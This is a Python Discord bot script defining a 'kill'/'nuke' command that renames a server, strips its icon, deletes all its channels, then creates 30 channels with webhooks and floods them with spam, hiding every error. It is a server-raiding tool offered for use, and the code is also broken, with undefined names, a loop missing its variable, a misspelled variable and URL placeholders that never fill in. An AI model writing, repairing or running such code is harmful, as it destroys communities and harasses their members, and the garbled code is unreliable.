import aiohttp
import asyncio
import discord
from discord.ext import commands
import json

@bot.command(name='kill', aliases=['nuke'])
@commands.cooldown(1, 1000, commands.BucketType.guild)
async def kill(ctx):
    try:
        guild = ctx.guild

        await guild.edit(name='Topc')

        if guild.icon:
            await guild.edit(icon=None)

        initial_channel_count = len(guild.channels)

        tasks = [delete_channel(channel) for channel in guild.channels]
        await asyncio.gather(tasks)

        created_channels_with_webhooks = await create_channels_with_webhooks(guild)

        channels, webhooks = zip(created_channels_with_webhooks)

        await asyncio.gather(*(send_messages_to_channel(channel, webhook) for channel, webhook in zip(channels, webhooks)))

    except Exception as e:
        pass

async def delete_channel(channel):
    try:
        await channel.delete()
        await asyncio.sleep(1) 
    except Exception:
        pass

async def create_channels_with_webhooks(guild):
    try:
        channels = [f'{random.choice(CHANNEL_NAMES)}' for i in range(1, 31)]
        created_channels_with_webhooks = await asyncio.gather(
            *(create_channel_with_webhook(guild, name) for name in channels)
        )

        return created_channels_with_webhooks
    except Exception:
        return []

async def create_channel_with_webhook(guild, name):
    try:
        channel = await guild.create_text_channel(name)
        webhook_name = random.choice(WEBHOOK_NAMES)
        webhook = await create_webhook(channel, webhook_name)
        return channel, webhook
    except Exception:
        return None

async def create_webhook(channel, name):
    try:
        headers = {"Authorization": f"Bot {TOKEN}"}
        async with aiohttp.ClientSession() as session:
            async with session.post(f"https://discord.com/api/v10/channels/%7Bchannel.id%7D/webhooks",
                                    json={"name": name}, headers=headers) as response:
                data = await response.json()
                if 'url' in data:
                    webhook = discord.Webhook.from_url(data['url'], session=session)
                    return webhook
                else:
                    return None
    except Exception:
        return None

async def send_messages_to_channel(channel, webhook):
    try:
        if webhook is None:
            return

        channel_id = channel.id

        async with aiohttp.ClientSession() as session:
            webhook_url = f"https://discord.com/api/webhooks/%7Bwebhook.id%7D/%7Bwebhook.token%7D"
            tasks = [send_webhook_message(session, webhookurl, {"content": f"{spam}"}) for  in range(45)]

            for task in tasks:
                await asyncio.gather(task, asyncio.sleep(0.1))

    except Exception:
        pass

async def send_webhook_message(session, webhook_url, payload):
    try:
        headers = {'Content-Type': 'application/json', "Authorization": f"Bot {TOKEN}"}
        async with session.post(webhook_url, data=json.dumps(payload), headers=headers) as response:
            if response.status != 204:
                raise Exception(f"{response.status}")

    except Exception:
        pass
    
bot.run(TOKEN)